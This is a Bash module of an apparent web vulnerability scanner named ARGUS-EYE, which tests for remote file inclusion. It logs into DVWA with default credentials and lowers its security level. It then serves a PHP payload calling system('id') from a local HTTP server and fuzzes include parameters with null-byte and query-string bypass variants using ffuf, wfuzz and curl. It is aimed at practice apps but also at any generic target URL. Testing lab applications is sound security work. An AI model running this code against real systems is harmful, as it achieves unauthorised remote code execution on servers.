#!/bin/bash
# ================================================
# ARGUS-EYE - RFI Scanner Module
# Tools: ffuf, wfuzz, custom_tests
# ================================================

SCANNER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CORE_DIR="$(cd "$SCANNER_DIR/../core" && pwd)"
SCRIPT_DIR="$(cd "$SCANNER_DIR/../.." && pwd)"
TEMP_DIR="/tmp/argus_rfi_$$"
mkdir -p "$TEMP_DIR"

source "$CORE_DIR/utils.sh"
source "$CORE_DIR/installer.sh"
source "$CORE_DIR/tool_selection.sh"

# ================================================
# PROGRESS TRACKING
# ================================================
TOTAL_STEPS=0; CURRENT_STEP=0; PROGRESS_BAR_WIDTH=40

init_progress() {
    TOTAL_STEPS=$1; CURRENT_STEP=0
    >&2 echo ""
    >&2 echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    >&2 echo -e "${CYAN}║                    RFI SCAN PROGRESS                        ║${NC}"
    >&2 echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    >&2 echo ""
}
update_progress() {
    CURRENT_STEP=$((CURRENT_STEP+1))
    local p=$((CURRENT_STEP*100/TOTAL_STEPS))
    local f=$((p*PROGRESS_BAR_WIDTH/100))
    local e=$((PROGRESS_BAR_WIDTH-f))
    >&2 printf "\r${YELLOW}[${NC}"
    for ((i=0;i<f;i++)); do >&2 printf "${GREEN}▓${NC}"; done
    for ((i=0;i<e;i++)); do >&2 printf "${WHITE}░${NC}"; done
    >&2 printf "${YELLOW}] ${p}%% ${CYAN}($CURRENT_STEP/$TOTAL_STEPS)${NC} $1"
}
complete_progress() {
    >&2 echo ""; >&2 echo ""
    >&2 echo -e "${GREEN}✓ Scan completed!${NC}"
}
show_step() {
    local s=$1 t=$2 tool=$3 st=$4
    case $st in
        "start")    >&2 echo -ne "\n ${CYAN}▶ Step $s/$t:${NC} Running $tool... " ;;
        "complete") >&2 echo -e "${GREEN}✓${NC}" ;;
        "fail")     >&2 echo -e "${RED}✗${NC}" ;;
    esac
}
spinner() {
    local pid=$1 delay=0.1 spinstr='|/-\'
    while kill -0 "$pid" 2>/dev/null; do
        local temp=${spinstr#?}
        >&2 printf " [%c] " "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        >&2 printf "\b\b\b\b\b\b"
    done
    >&2 printf "      \b\b\b\b\b\b"
}

# ================================================
# DVWA AUTO-DETECT
# ================================================
DVWA_BASE=""

detect_dvwa_base() {
    local target=$1
    local candidates=("$target" "${target}/dvwa" "${target}/DVWA")
    for candidate in "${candidates[@]}"; do
        local page
        page=$(curl -s --max-time 5 "${candidate}/login.php" 2>/dev/null)
        if echo "$page" | grep -qi "dvwa\|damn vulnerable"; then
            DVWA_BASE="$candidate"
            >&2 echo -e "${GREEN}[✓] DVWA detected at: $DVWA_BASE${NC}"
            return 0
        fi
    done
    >&2 echo -e "${YELLOW}[*] DVWA not detected — treating as generic target${NC}"
    DVWA_BASE=""
    return 1
}

# ================================================
# DVWA AUTO-LOGIN
# ================================================
dvwa_autologin() {
    local base_url=$1
    local cookie_jar="/tmp/dvwa_cookies"

    if [[ -f "$cookie_jar" ]]; then
        local test_check
        test_check=$(curl -s --max-time 3 -b "$cookie_jar" "${base_url}/index.php" 2>/dev/null)
        if echo "$test_check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
            >&2 echo -e "${GREEN}[✓] Existing session still valid — reusing${NC}"
            return 0
        fi
    fi

    rm -f "$cookie_jar"
    >&2 echo -e "\n${CYAN}[*] Logging into DVWA at ${base_url}...${NC}"

    curl -s -c "$cookie_jar" "${base_url}/login.php" -o /tmp/dvwa_lp_$$.html 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/login.php" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=admin" \
        --data-urlencode "Login=Login" \
        -L -o /dev/null 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/security.php" \
        --data "security=low&seclev_submit=Submit" \
        -o /dev/null 2>/dev/null
    rm -f /tmp/dvwa_lp_$$.html

    local check
    check=$(curl -s -b "$cookie_jar" "${base_url}/index.php" 2>/dev/null)
    if echo "$check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
        >&2 echo -e "${GREEN}[✓] Login successful (admin/admin)${NC}"
        return 0
    fi

    >&2 echo -e "${YELLOW}[*] admin/admin failed — trying admin/password${NC}"
    rm -f "$cookie_jar"
    curl -s -c "$cookie_jar" "${base_url}/login.php" -o /dev/null 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/login.php" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=password" \
        --data-urlencode "Login=Login" \
        -L -o /dev/null 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/security.php" \
        --data "security=low&seclev_submit=Submit" \
        -o /dev/null 2>/dev/null

    check=$(curl -s -b "$cookie_jar" "${base_url}/index.php" 2>/dev/null)
    if echo "$check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
        >&2 echo -e "${GREEN}[✓] Login successful (admin/password)${NC}"
        return 0
    fi

    >&2 echo -e "${RED}[!] Login failed — check DVWA is running${NC}"
    return 1
}

# ================================================
# RFI LISTENER — spin up a temp HTTP server
# to serve a remote PHP payload and confirm
# that the target actually fetched it
# ================================================
start_rfi_listener() {
    local port=${1:-9191}
    local serve_dir="$TEMP_DIR/rfi_serve"
    mkdir -p "$serve_dir"

    # Payload file — if executed, writes a marker file
    cat > "$serve_dir/rfi_test.php" << 'PHP'
<?php echo "ARGUS_RFI_CONFIRMED"; system("id"); ?>
PHP

    # Also serve a plain .txt version for targets that strip .php
    echo "ARGUS_RFI_CONFIRMED" > "$serve_dir/rfi_test.txt"

    # Start python HTTP server in background
    cd "$serve_dir"
    python3 -m http.server "$port" &>/dev/null &
    RFI_SERVER_PID=$!
    cd - &>/dev/null

    >&2 echo -e "${CYAN}[*] RFI listener started on port $port (PID: $RFI_SERVER_PID)${NC}"
}

stop_rfi_listener() {
    if [[ -n "$RFI_SERVER_PID" ]]; then
        kill "$RFI_SERVER_PID" 2>/dev/null
        wait "$RFI_SERVER_PID" 2>/dev/null
        RFI_SERVER_PID=""
    fi
}

# Get local IP for RFI payloads
get_local_ip() {
    ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "127.0.0.1"
}

# ================================================
# TOOL FUNCTIONS
# ================================================

run_ffuf_rfi() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "ffuf (RFI)" "start"

    if ! command -v ffuf &>/dev/null; then
        echo "ffuf not installed — skipped" > "$out"
        show_step "$step" "$total" "ffuf" "fail"
        update_progress "ffuf skipped (not installed)"
        echo "0" > "$TEMP_DIR/ffuf_count.tmp"
        return 1
    fi

    local local_ip
    local_ip=$(get_local_ip)
    local rfi_port=9191

    start_rfi_listener "$rfi_port"
    sleep 1

    # Build RFI payload wordlist
    local payload_file="$TEMP_DIR/rfi_payloads.txt"
    cat > "$payload_file" << PAYLOADS
http://${local_ip}:${rfi_port}/rfi_test.php
http://${local_ip}:${rfi_port}/rfi_test.txt
http://${local_ip}:${rfi_port}/rfi_test.php%00
http://${local_ip}:${rfi_port}/rfi_test.php?
http://${local_ip}:${rfi_port}/rfi_test.php#
PAYLOADS

    > "$out"

    # Determine fuzz URL
    local fuzz_url
    if [[ -n "$DVWA_BASE" ]]; then
        fuzz_url="${DVWA_BASE}/vulnerabilities/fi/?page=FUZZ"
    elif [[ "$target" == *"mutillidae"* ]]; then
        local mutil_base
        mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
        fuzz_url="${mutil_base}/index.php?page=FUZZ"
    else
        fuzz_url="${target}?file=FUZZ"
    fi

    # Cookie for DVWA
    local cookie_arg=()
    if [[ -n "$DVWA_BASE" && -f /tmp/dvwa_cookies ]]; then
        local phpsessid
        phpsessid=$(grep -i "PHPSESSID" /tmp/dvwa_cookies | awk '{print $NF}' | head -1)
        [[ -n "$phpsessid" ]] && cookie_arg=(-H "Cookie: PHPSESSID=${phpsessid}; security=low")
    fi

    >&2 echo -e "\n  ${CYAN}└─ ffuf RFI fuzzing: $fuzz_url${NC}"

    ffuf -u "$fuzz_url" -w "$payload_file" -c -t 5 \
        "${cookie_arg[@]}" \
        -mr "ARGUS_RFI_CONFIRMED" \
        >> "$out" 2>&1 &
    spinner $!
    wait $!

    stop_rfi_listener

    local findings=0
    if [[ -f "$out" ]]; then
        # ffuf prints matched FUZZ value and status — detect any line showing a hit
        # Format: "http://payload [Status: 200, ...]" or lines with our payload URL
        while IFS= read -r line; do
            local payload
            payload=$(echo "$line" | grep -oE 'https?://[^ ]+' | head -1)
            {
                echo "[CRITICAL] RFI Confirmed — Remote File Inclusion"
                echo "  Tool     : ffuf"
                echo "  Target   : $fuzz_url"
                echo "  Payload  : ${payload:-see raw output}"
                echo "  Evidence : Remote PHP payload fetched and executed by server"
                echo "  Severity : CRITICAL"
                echo ""
            } >> "$findings_file"
            findings=$((findings+1))
        done < <(grep -E "Status: 200|rfi_test" "$out" 2>/dev/null | grep -v "^::" | grep -v "^$")
    fi

    show_step "$step" "$total" "ffuf" "complete"
    update_progress "ffuf completed ($findings findings)"
    echo "$findings" > "$TEMP_DIR/ffuf_count.tmp"
    return 0
}

run_wfuzz_rfi() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "wfuzz (RFI)" "start"

    if ! command -v wfuzz &>/dev/null; then
        echo "wfuzz not installed — skipped" > "$out"
        show_step "$step" "$total" "wfuzz" "fail"
        update_progress "wfuzz skipped (not installed)"
        echo "0" > "$TEMP_DIR/wfuzz_count.tmp"
        return 1
    fi

    local local_ip
    local_ip=$(get_local_ip)
    local rfi_port=9192

    start_rfi_listener "$rfi_port"
    sleep 1

    local payload_file="$TEMP_DIR/rfi_payloads_wfuzz.txt"
    cat > "$payload_file" << PAYLOADS
http://${local_ip}:${rfi_port}/rfi_test.php
http://${local_ip}:${rfi_port}/rfi_test.php%00
http://${local_ip}:${rfi_port}/rfi_test.php?
PAYLOADS

    > "$out"

    # Determine fuzz URL and cookie — use array to avoid word-splitting
    local fuzz_url
    local cookie_arg=()
    if [[ -n "$DVWA_BASE" ]]; then
        fuzz_url="${DVWA_BASE}/vulnerabilities/fi/?page=FUZZ"
        if [[ -f /tmp/dvwa_cookies ]]; then
            local phpsessid
            phpsessid=$(grep -i "PHPSESSID" /tmp/dvwa_cookies | awk '{print $NF}' | head -1)
            [[ -n "$phpsessid" ]] && cookie_arg=(-H "Cookie: PHPSESSID=${phpsessid}; security=low")
        fi
    elif [[ "$target" == *"mutillidae"* ]]; then
        local mutil_base
        mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
        fuzz_url="${mutil_base}/index.php?page=FUZZ"
    else
        fuzz_url="${target}?file=FUZZ"
    fi

    >&2 echo -e "\n  ${CYAN}└─ wfuzz RFI fuzzing: $fuzz_url${NC}"

    wfuzz -c -z file,"$payload_file" \
        --ss "ARGUS_RFI_CONFIRMED" \
        "${cookie_arg[@]}" \
        "$fuzz_url" >> "$out" 2>&1 &
    spinner $!
    wait $!

    stop_rfi_listener

    local findings=0
    if [[ -f "$out" ]]; then
        # wfuzz result lines start with 9-digit ID like "000000001:"
        # Only count those — avoids matching header/target lines containing FUZZ
        while IFS= read -r line; do
            local payload
            payload=$(echo "$line" | grep -oE 'https?://[^ ]+' | head -1)
            {
                echo "[CRITICAL] RFI Confirmed — Remote File Inclusion"
                echo "  Tool     : wfuzz"
                echo "  Target   : $fuzz_url"
                echo "  Payload  : ${payload:-see raw output}"
                echo "  Evidence : Remote PHP payload fetched and executed by server"
                echo "  Severity : CRITICAL"
                echo ""
            } >> "$findings_file"
            findings=$((findings+1))
        done < <(grep -E "^0+[0-9]+:" "$out" 2>/dev/null)
    fi

    show_step "$step" "$total" "wfuzz" "complete"
    update_progress "wfuzz completed ($findings findings)"
    echo "$findings" > "$TEMP_DIR/wfuzz_count.tmp"
    return 0
}

run_custom_rfi_tests() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "Custom Tests" "start"

    local counter_file="$TEMP_DIR/rfi_count_$$.tmp"
    echo "0" > "$counter_file"

    local local_ip
    local_ip=$(get_local_ip)
    local rfi_port=9193

    # Start listener
    start_rfi_listener "$rfi_port"
    sleep 1

    local base_url="http://${local_ip}:${rfi_port}"

    # RFI payloads — various bypass techniques
    local rfi_payloads=(
        "${base_url}/rfi_test.php"
        "${base_url}/rfi_test.php%00"
        "${base_url}/rfi_test.php?"
        "${base_url}/rfi_test.php#"
        "${base_url}/rfi_test.txt"
        "http://${local_ip}:${rfi_port}/rfi_test.php"
        "//${local_ip}:${rfi_port}/rfi_test.php"
    )

    local confirm_pattern="ARGUS_RFI_CONFIRMED|uid=|www-data"

    {
        echo "=== CUSTOM RFI TESTS ==="
        echo "Target  : $target"
        echo "Listener: $base_url"
        echo "Date    : $(date)"
        echo ""

        # ── DVWA RFI ────────────────────────────────────────────────────────
        if [[ -n "$DVWA_BASE" ]]; then
            local cjar="/tmp/dvwa_cookies"
            local rfi_url="${DVWA_BASE}/vulnerabilities/fi/"
            >&2 echo -e "${CYAN}[*] Testing DVWA RFI at: $rfi_url${NC}"
            echo "--- DVWA RFI Tests ---"

            # Check RFI is enabled (allow_url_include must be On)
            local probe
            probe=$(curl -s --max-time 5 -b "$cjar" \
                "${rfi_url}?page=http://127.0.0.1/" 2>/dev/null)
            if echo "$probe" | grep -qi "failed to open stream\|allow_url_include"; then
                >&2 echo -e "${YELLOW}[!] Warning: allow_url_include may be Off — RFI might not work${NC}"
                echo "  [!] Note: allow_url_include may be Off on this server"
                echo "  [!] Enable it: edit php.ini → allow_url_include = On"
                echo ""
            fi

            for payload in "${rfi_payloads[@]}"; do
                echo -n "  ?page=${payload}... "
                local response
                response=$(curl -s -L --max-time 8 -b "$cjar" \
                    "${rfi_url}?page=${payload}" 2>/dev/null)
                if echo "$response" | grep -qE "$confirm_pattern"; then
                    echo "VULNERABLE! (remote payload executed)"
                    {
                        echo "[CRITICAL] RFI Confirmed — Remote File Inclusion"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $DVWA_BASE (DVWA)"
                        echo "  URL      : ${rfi_url}?page=${payload}"
                        echo "  Param    : page"
                        echo "  Payload  : ${payload}"
                        echo "  Evidence : Remote PHP payload executed — ARGUS_RFI_CONFIRMED in response"
                        echo "  Severity : CRITICAL"
                        echo "  Note     : Attacker can execute arbitrary code on the server"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "Not vulnerable / RFI not triggered"
                fi
            done

        # ── Mutillidae RFI ───────────────────────────────────────────────────
        elif [[ "$target" == *"mutillidae"* ]] || [[ "$target" == *"Mutillidae"* ]]; then
            local mutil_base
            mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
            >&2 echo -e "${CYAN}[*] Testing Mutillidae RFI${NC}"
            echo "--- Mutillidae RFI Tests ---"

            for payload in "${rfi_payloads[@]}"; do
                echo -n "  ?page=${payload}... "
                local response
                response=$(curl -s -L --max-time 8 \
                    "${mutil_base}/index.php?page=${payload}" 2>/dev/null)
                if echo "$response" | grep -qE "$confirm_pattern"; then
                    echo "VULNERABLE!"
                    {
                        echo "[CRITICAL] RFI Confirmed — Remote File Inclusion"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $mutil_base (Mutillidae)"
                        echo "  URL      : ${mutil_base}/index.php?page=${payload}"
                        echo "  Param    : page"
                        echo "  Payload  : ${payload}"
                        echo "  Evidence : Remote PHP payload executed — ARGUS_RFI_CONFIRMED in response"
                        echo "  Severity : CRITICAL"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "Not vulnerable"
                fi
            done

        # ── testphp ──────────────────────────────────────────────────────────
        elif [[ "$target" == *"testphp.vulnweb.com"* ]]; then
            >&2 echo -e "${CYAN}[*] Testing testphp RFI params${NC}"
            echo "--- testphp RFI Tests ---"

            for param in "file" "page" "include" "path"; do
                for payload in "${rfi_payloads[@]}"; do
                    echo -n "  ?${param}=${payload}... "
                    local response
                    response=$(curl -s -L --max-time 8 \
                        "${target}?${param}=${payload}" 2>/dev/null)
                    if echo "$response" | grep -qE "$confirm_pattern"; then
                        echo "VULNERABLE!"
                        {
                            echo "[CRITICAL] RFI Confirmed"
                            echo "  Tool     : custom_tests"
                            echo "  Target   : $target (testphp)"
                            echo "  URL      : ${target}?${param}=${payload}"
                            echo "  Param    : ${param}"
                            echo "  Payload  : ${payload}"
                            echo "  Evidence : Remote PHP payload executed"
                            echo "  Severity : CRITICAL"
                            echo ""
                        } >> "$findings_file"
                        echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    else
                        echo "Not vulnerable"
                    fi
                done
            done

        # ── Generic ──────────────────────────────────────────────────────────
        else
            >&2 echo -e "${CYAN}[*] Testing generic target for RFI${NC}"
            echo "--- Generic RFI Tests ---"

            local params=("file" "page" "include" "path" "doc" "load" "read" "url" "src" "template")
            for param in "${params[@]}"; do
                for payload in "${rfi_payloads[@]}"; do
                    echo -n "  ?${param}=${payload}... "
                    local response
                    response=$(curl -s -L --max-time 8 \
                        "${target}?${param}=${payload}" 2>/dev/null)
                    if echo "$response" | grep -qE "$confirm_pattern"; then
                        echo "VULNERABLE!"
                        {
                            echo "[CRITICAL] RFI Confirmed"
                            echo "  Tool     : custom_tests"
                            echo "  Target   : $target (generic)"
                            echo "  URL      : ${target}?${param}=${payload}"
                            echo "  Param    : ${param}"
                            echo "  Payload  : ${payload}"
                            echo "  Evidence : Remote PHP payload executed"
                            echo "  Severity : CRITICAL"
                            echo ""
                        } >> "$findings_file"
                        echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    else
                        echo "Not vulnerable"
                    fi
                done
            done
        fi

        local final_count
        final_count=$(cat "$counter_file")
        echo ""
        echo "Custom RFI tests completed with $final_count findings"

    } > "$out" 2>&1

    stop_rfi_listener

    local custom_findings
    custom_findings=$(cat "$counter_file")
    rm -f "$counter_file"

    show_step "$step" "$total" "Custom Tests" "complete"
    update_progress "Custom tests completed ($custom_findings findings)"
    echo "$custom_findings" > "$TEMP_DIR/custom_rfi_count.tmp"
}

# ================================================
# MAIN RFI SCAN FUNCTION
# ================================================
scan_rfi() {
    local target=$1 output_dir=$2 selected_tools=$3
    mkdir -p "$output_dir"/{raw_output,findings}
    local findings_file="$output_dir/findings/rfi_findings.txt"
    local summary_file="$output_dir/raw_output/rfi_summary.txt"

    detect_dvwa_base "$target"
    if [[ -n "$DVWA_BASE" ]]; then
        dvwa_autologin "$DVWA_BASE"
    fi

    {
        echo "========================================"
        echo "RFI SCAN RESULTS"
        echo "========================================"
        echo "Target: $target"
        echo "Date: $(date)"
        echo "Tools used: $selected_tools"
        echo ""
        echo "IMPORTANT: RFI requires allow_url_include=On in php.ini"
        echo "For DVWA: edit /etc/php*/apache2/php.ini or /etc/php.ini"
        echo "========================================"
        echo ""
    } > "$findings_file"

    >&2 echo -e "${CYAN}\n┌─────────────────────────────────────────────────────────────────────┐"
    >&2 echo -e "│                     RFI VULNERABILITY SCANNER                      │"
    >&2 echo -e "└─────────────────────────────────────────────────────────────────────┘${NC}"
    >&2 echo -e "${YELLOW}[*] Target: $target${NC}"
    >&2 echo -e "${YELLOW}[*] Tools:  $selected_tools${NC}"
    >&2 echo -e "${RED}[!] RFI requires allow_url_include=On in php.ini${NC}\n"

    IFS=' ' read -ra TOOL_ARRAY <<< "$selected_tools"
    local total_tools=${#TOOL_ARRAY[@]}
    init_progress $total_tools
    local total_findings=0 tools_run=0 tools_success=0

    for tool in "${TOOL_ARRAY[@]}"; do
        tools_run=$((tools_run+1))
        local tool_output="$output_dir/raw_output/${tool}_rfi.txt"
        local tool_findings=0

        case $tool in
            "ffuf")
                if run_ffuf_rfi "$target" "$tool_output" "$findings_file" \
                        "$tools_run" "$total_tools"; then
                    tools_success=$((tools_success+1))
                fi
                if [[ -f "$TEMP_DIR/ffuf_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/ffuf_count.tmp")
                    rm -f "$TEMP_DIR/ffuf_count.tmp"
                fi
                ;;
            "wfuzz")
                if run_wfuzz_rfi "$target" "$tool_output" "$findings_file" \
                        "$tools_run" "$total_tools"; then
                    tools_success=$((tools_success+1))
                fi
                if [[ -f "$TEMP_DIR/wfuzz_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/wfuzz_count.tmp")
                    rm -f "$TEMP_DIR/wfuzz_count.tmp"
                fi
                ;;
            "custom_tests")
                run_custom_rfi_tests "$target" "$tool_output" "$findings_file" \
                    "$tools_run" "$total_tools"
                tools_success=$((tools_success+1))
                if [[ -f "$TEMP_DIR/custom_rfi_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/custom_rfi_count.tmp")
                    rm -f "$TEMP_DIR/custom_rfi_count.tmp"
                fi
                ;;
            *)
                >&2 echo -e "${YELLOW}[!] Unknown tool: $tool${NC}"
                ;;
        esac

        [[ "$tool_findings" =~ ^[0-9]+$ ]] || tool_findings=0
        total_findings=$((total_findings + tool_findings))
        echo "$tool findings: $tool_findings" >> "$findings_file"
        >&2 echo ""
    done

    {
        echo ""
        echo "========================================"
        echo "SCAN SUMMARY"
        echo "========================================"
        echo "Tools run: $tools_run"
        echo "Tools successful: $tools_success"
        echo "Total findings: $total_findings"
        echo "========================================"
    } >> "$findings_file"

    # Cleanup
    stop_rfi_listener 2>/dev/null
    rm -rf "$TEMP_DIR"

    echo "$total_findings" > "$summary_file"
    complete_progress
    >&2 echo -e "${GREEN}[✓] RFI scan completed${NC}"
    >&2 echo -e "${YELLOW}[*] Tools run: $tools_run/$total_tools${NC}"
    >&2 echo -e "${RED}[*] Total findings: $total_findings${NC}\n"
    echo "$total_findings"
}

# ================================================
# SCRIPT ENTRY POINT
# ================================================
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    [[ $# -lt 3 ]] && {
        >&2 echo -e "${RED}[!] Usage: $0 <target_url> <output_dir> <selected_tools>${NC}"
        exit 1
    }
    findings=$(scan_rfi "$1" "$2" "$3")
    echo "FINDINGS_COUNT=$findings"
    exit 0
fi
